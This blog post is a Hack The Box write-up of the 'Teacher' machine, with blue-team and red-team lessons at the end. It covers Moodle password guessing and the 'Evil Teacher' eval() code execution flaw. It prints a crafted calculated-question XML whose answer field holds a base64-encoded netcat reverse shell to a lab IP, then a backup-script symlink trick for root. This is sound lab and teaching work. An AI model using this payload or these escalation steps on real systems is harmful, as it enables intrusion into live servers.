---
layout: post
title: "HTB Post-Root Writeup: Teacher"
date: 2019-04-20 19:00 -000
categories: HTB
---

Teacher was the first [HackTheBox](https://hackthebox.eu) machine I attempted to pwn after creating [the Enumpi](https://www.kenshosec.com/Guides/enumpi1.html), my (primitive) network enumeration tool. Because of that, I figured out extremely quickly that it was hosting something I'm actually really familiar with through my day job - a Learning Management System. This was one of the harder boxes I've worked on to date, mostly because it really was designed around working you back down to basics. Everything from initial foothold exploitation to finally getting the root flag took ages (around two month's worth of Sundays), all because it relied on really basic information that I just didn't have fully grocked. It was a highly valuable experience, and my recommendation to you if you have VIP is to dig the machine out of retirement and give it a test yourself. You'll be glad you did.

# Step I: Initial Enumeraton and App-Admin Access
Because I had the Enumpi's output, I already knew which TCP and UDP ports were open on this machine, as well as a fairly exhaustive lift of the top-level of paths after the main domain, at least according to the server on port 80. Right away, something jumped out at me - they're running Moodle.

[Moodle](https://moodle.org) is an open-source Learning Management system. I use it frequently with my day job, as a third-party platform for testing the courseware we produce. It's fun.

This particular instance of Moodle was well locked-down, requiring authentication to do pretty well everything. This is an improvement of sorts - in some moodle instances, a guest account is enough to do some damage. Not so for this machine.

I spent several hours looking for a SQL injection to authenticate and it just never came to pass. Eventually, a friend of mine pointed out something I'd neglected - there is a file on the server with a bad mismatch between its purported type (PNG) and it's MIME Type (text/text). This was so unusual that it should have been an obvious clue, and in fact was the body of an email to support where Giovanni was asking to have support figure out the last character of his password: `Th4C00lTheacha`.

I could and would have written a script to automate guessing that final character, but I tried to log into moodle as `giovanni` using the password `Th4C00lTehacha#`, my logic being that a link to the user's account showed him as having user ID 3, and on a US keyboard layout, # is shift-3. This turned out to be correct.

# Step II: Moodle Administrator to Local Shell
Like a lot of web applications, moodle has a lot of CVEs in past and present versions which allow a pivot from some level of web application authentication to having a shell on the host machine, usually as the user running the service (often www-data). One particular one that I was familiar with from past exploits involves setting the application's spell-check binary to an arbitrary binary on the host machine.

Like a lot of HTB machines, however, "Teacher" was a clue, referring to the Evil Teacher vulnerability. This vulnerability is explained in more detail [here](https://blog.ripstech.com/2018/moodle-remote-code-execution/), but for our purposes, it's sufficient to note that courses have quizzes, quizzes have questions, and one particlar question type, a "calculated question", leverages a relatively unprotected php `eval()` call to do its job.

In our case, we were dealing with a relatively patched version of moodle, so we had to use what was, essentially, the most complicated version of the attack - sabotaging an XML export of the question bank and re-importing it with our tailored question containing the exploit. Modifying the XML allowed the attack to proceed because you could create an invalid version of the question which never had its variables replaced with static values, which was the previous protection on the eval call.

In my case, I forced the following question:
```xml
  <question type="calculated">
    <name>
      <text>PatchQ</text>
    </name>
    <questiontext format="html">
      <text>What is the sum of the first 1337 numbers in the fibonacci set?</text>
    </questiontext>
    <generalfeedback format="html">
      <text></text>
    </generalfeedback>
    <defaultgrade>1.0000000</defaultgrade>
    <penalty>0.3333333</penalty>
    <hidden>0</hidden>
    <synchronize>0</synchronize>
    <single>0</single>
    <answernumbering>abc</answernumbering>
    <shuffleanswers>1</shuffleanswers>
    <correctfeedback>
      <text></text>
    </correctfeedback>
    <partiallycorrectfeedback>
      <text></text>
    </partiallycorrectfeedback>
    <incorrectfeedback>
      <text></text>
    </incorrectfeedback>
<answer fraction="100">
    <text>log(1){exec(base64_decode(cm0gL3RtcC9mOyBta2ZpZm8gL3RtcC9mOyBjYXQgL3RtcC9mIHwgL2Jpbi9zaCAtaSAyPiYxIHxuYyAxMC4xMC4xNC4xOCAxNDQxID4gL3RtcC9m
))
}</text>
    <tolerance>0.01</tolerance>
    <tolerancetype>1</tolerancetype>
    <correctanswerformat>1</correctanswerformat>
    <correctanswerlength>2</correctanswerlength>
    <feedback format="html">
<text></text>
    </feedback>
</answer>
    <unitgradingtype>0</unitgradingtype>
    <unitpenalty>0.1000000</unitpenalty>
    <showunits>3</showunits>
    <unitsleft>0</unitsleft>
<dataset_definitions>
<dataset_definition>
    <status><text>private</text>
</status>
    <name><text>x</text>
</name>
    <type>calculated</type>
    <distribution><text>uniform</text>
</distribution>
    <minimum><text>1</text>
</minimum>
    <maximum><text>10</text>
</maximum>
    <decimals><text>1</text>
</decimals>
    <itemcount>1</itemcount>
    <dataset_items>
        <dataset_item>
           <number>1</number>
           <value>1.4</value>
        </dataset_item>
    </dataset_items>
    <number_of_items>1</number_of_items>
</dataset_definition>
<dataset_definition>
    <status><text>private</text>
</status>
    <name><text>y</text>
</name>
    <type>calculated</type>
    <distribution><text>uniform</text>
</distribution>
    <minimum><text>1</text>
</minimum>
    <maximum><text>10</text>
</maximum>
    <decimals><text>1</text>
</decimals>
    <itemcount>1</itemcount>
    <dataset_items>
        <dataset_item>
           <number>1</number>
           <value>4.9</value>
        </dataset_item>
    </dataset_items>
    <number_of_items>1</number_of_items>
</dataset_definition>
</dataset_definitions>
  </question>
```

This question, upon evaluation, triggers the payload, which in this case was a really inelegant netcat-based reverse shell, creating a FIFO object in tmp, and piping it through /bin/sh, through netcat, which I caught with netcat on my own machine.

This is really inelegant solution for two reasons:
1. It creates a very inelegant shell for me to use later, full of misbehaviours, and;
2. It actually halts execution of the rest of the moodle service until the request times out, regardless of if my shell is still connected or not.

While the first issue could be worked around somewhat with our old friend `python -c 'import pty;pty.span("/bin/bash")`, the second issue was problematic for a number of reasons. First, it halted progress for everyone else and caused this to be a frequently-reset machine (clearing the state back to 0 and basically being a problem), and second, it made it a pain if one accidentally closed the shell.

Ideally, I could have - and still might have - found a more elegant reverse shell. As it was though, I'd spent several days trying to find the right reverse shell to inject to get any kind of access at all, so I stuck with this and soldiered on.

```commandline
$ whoami
www-data
```

# Step III: Service to User by Way of Dumb
I think a pretty good and self-evident bit of advice when exploiting WebApps is to be familiar with the mechanics of their function. Moodle, like a lot of Web Applications, relies on a database (mysql, usually, or mariadb) to keep track of everything. And there's a lot of everything.

I already had the moodle documentation, so I knew that a config file www-data could read would have the port number, hostname, and credentials for that DB in the plain. How lovely! I also knew the structure of that database.

I dumped out the `user` table, curious to see if perhaps there was a clue there. As it turns out moodle protects their user password hashes with bCrypt, meaning that they were all uniquely salted, which would have been a problem.

However, in this case, there are only four users, one of which was named `giovannibak`, and which had a peculiar-looking, plain SHA-256 hash.

Grabbing a rainbow table, it was easy to determine that this hash was in fact the hash of the string `expelled`. It wasn't a massive leap from there to thinking that this was probably the password of the giovanni user, which is right. From there, just go home and `cat user.txt` for the flag.

# Step IV: User to Root By Way of Caution
Poking around `giovanni`'s home directory, it became immediately clear that there a backup script running. What was particularly weird was that the backup itself had been created by, and was owned by, `root`. Of course, it had 777 permissions, and so did everything inside it, but this was weird. WEIRD.

It took me longer than it should have to realize that I could probably `find` the script creating the backup, and I eventually did - it was a world-executable, world-readable shell script hiding at /usr/bin/backup.sh.

The operation of this script was incredibly simplistic. It was a simple job, jumping into a particular directory of giovanni's home, tarring everything it found there (recursively), then moving to a temp directory for the output of the tarball, and to further extract that tarball into place before chmodding everything in the backup to `777`.

I spent ages at this point fussing with two problems:
1. The script was being run as root, but it wasn't `sticky`. I eventually realized I had to wait for a relatively-frequent (actually, absurdly frequent) `cron` job running as root to trigger it.
2. You can't hard-link to a file you can't read, and soft links stay soft links in tarballs.

Eventually, by which I mean roughly the next morning, I realized the solution here was to create a soft link to the `/root` directory in the same `~/work/tmp` directory where the script would recursively run chmod. Sit a few minutes, wait for the script to run again, and cat out your flag.

The same trick, more or less, could be used to make the script itself writeable. From that to creating a root shell as the root user is thereafter left as an exercise to the reader. This would be particularly insidious, as that backup script is run regularly, which would keep re-establishing the connection, I would think.

# Lessons and Takeaways
## Main Takeaway
The main takeaway here is that moodle, itself, is a very robust platform. If giovanni hadn't, for some reason, embedded most of his password in the system I could have been days brute forcing it before I ever had access to the LMS, and we all know there's mitigations for that as well.

## Lessons for the Blue Team
There's a lot of places here where users made things go wrong - specifically Giovanni. However, there were a few technical controls here that just plain failed.

### Giovanni's Moodle Password
Giovanni's moodle password was easy to guess or brute force because someone had placed an image on the server which was, actually, the renamed text file containing the body of an email where Giovanni included most of his passwords. It probably couldn't hurt to have someone draw up a script that finds and reports file-extension to mime-type mismatches on a web server to look for weird/broken things to fix.

**Indicator of compromise:** Virtually none. This password was embedded in an image that was linked to by one of the legit traffic pages on the server, so it's not even like it could have been logged as a canary.

### Giovanni's User Password
Someone on the system admin team really messed up by allowing Giovanni (or another) to manually made modifications to Moodle's underlying database. If you're familiar with storing creds in a DB, mixed types of password hashing stand out like a sore thumb. Giovanni/the unnamed sysadmin should not have been able to place that credential there. In point of fact, the whole service should have been running in a dedicated VM or as part of the web hosting platform. There should have been no daily-use "user" login shells available.

If for some reason Giovanni needed remote access to this system it should also have been done with a key-based auth rather than passphrase. I shouldn't have been able to SSH in.

**Indicator of compromise:** Access logs to the DB would have caught Giovanni hiding his password there, but they wouldn't have stopped me, since www-data NORMALLY needs access to the DB. If the actual queries themselves were logged, I'm certain the queries I made looked different. If www-data's bash history was logged, the fact that I was making all sorts of manual calls to try and find things would also appear suspicious. Finally, SSH should definitely be logged and if it was unusual for Giovanni to remote in through SSH then this would have been a massive red flag.

### /usr/bin/backup.sh
Okay, maybe I'm a bit biased because I'm the same jerk who wrote [Tapestry](https://github.com/zadammac/tapestry), but backup scripts aren't that hard to do right. There are a few better ways to do what the backup script was trying to do:
1. It was only ever backing up Giovanni's files, so it could be run *as* giovanni, or;
2. Instead of wildcard-reassigning everything in the output path ***recursively*** to perm 777, the output path of the backup tarball (which is static, and therefore known) could have been explicitly used - this is probably preferable.

Also, running that backup script on a more sane schedule would have significantly slowed down exploiting it, because it was, at least, not sticky-executable as root. However, the fact that it was exploitable to make arbitrary files world-writeable as well as world-executable, and the fact it was reliably executed by root, meant it ultimately could have been overridden and used to completely elevate an arbitrary user to root, or provide a root shell, or otherwise just entirely ruin your security.

**Indicator of compromise**: This one would be tricky. It would likely only come after I'd become root, but I never got as far as forcing the backup script to actually yield a root shell.

The attack in question made a mess of Giovanni's files, though. He'd have noticed the change the next time he logged in.

## Lessons for the Red Team

### The Enumpi Sucks
So far, the enumpi just does a quick wordlist `gobuster` attack against the first level of folders directly under the root of a given network address. This might be sufficient to identify quickly hosts with enough web application on them to be exploitable, but it's not as helpful as it could be.

It may be possible to add a helper function to determine if we "need to go deeper" in some cases, and recursively crawl a given page. Or, this could even be done manually through the enumpi with a direct gobuster call, and left to run seperately from the main enumeration script.

Fortunately, by the time I released this write-up, I'd kicked off a major project to massively increase the utility and expandibility of the EnumPi system.

**The New Tool Needed**: Arguably nothing - you can enumerate by hand. But I'm a toolsmith by nature and expanding enumpi in this instance makes sense to me. You can track the development of the next generation enumpi [here](https://github.com/zadammac/Enumpi/)

**The Blue Team's Defense**: Other than network segmentation and IPS/IDS there's not a hell of a lot that can be done to prevent enumeration, to my knowledge.

### Easter Egg Hunts Suck
Burp tells me I found hundreds, perhaps as many as a thousand, individual files on this server. I could never have visually grepped them all for the odd, mismatched file, and in fact I didn't - I had to have this pointed out to me by [peoplewhodostuff](https://www.hackthebox.eu/home/teams/profile/781) team captain Gingerroot.

What I need at this stage is an enumeration script somewhere in my toolbox that either is itself a spider looking for weirdness, or at least script to run against spider output that greps out all the weirdness it can find. I'd have to come up with the heuristics for that of course. Mime-Type mismatches seem to be a good place to start, but probably also unusually large or small filesizes may also be interesting.

**The New Tool Needed**: If burp is anything like Fiddler (my preferred tool, though not linux-native), it should be relatively easy to add some highlighting rules that would compare the header-types to the mime file type and visually enhance the obviousness of the object.

It'd also be pretty fun to add such a function to Enumpi - some kind of triggered or automatic spider that crawls target machine and alerts on unusual mismatches.

**The Blue Team's Defense**: A similar tool to the one described above, actually, would be helpful in identifyin and removing these kinds of files.

### A Lot of Attacks Rely on User Errors
If Giovanni had never accidentally embedded his Moodle password in the website, or his system-user password in the moodle DB, we'd either be `www-data` or nothing at all. Never underestimate the power of being able to overcome the human security element.

**The New Tool Needed**: You can't induce stupid.

**The Blue Team's Defense**: You can, however, fix it. Enhanced training of employees with access to sensitive systems should be prioritized.

HackTheBox is a nominally free platform, but I still pay for a VIP license so that I can have access to quieter versions of the network (and not bother anyone with enumpi). HTB is also the primary testing and development platform for Enumpi. All that being said, if you wanted to contribute to the project financially, your best avenue is via the Kensho Security Labs Coffee Fund, located [here](https://ko-fi.com/kenshosec).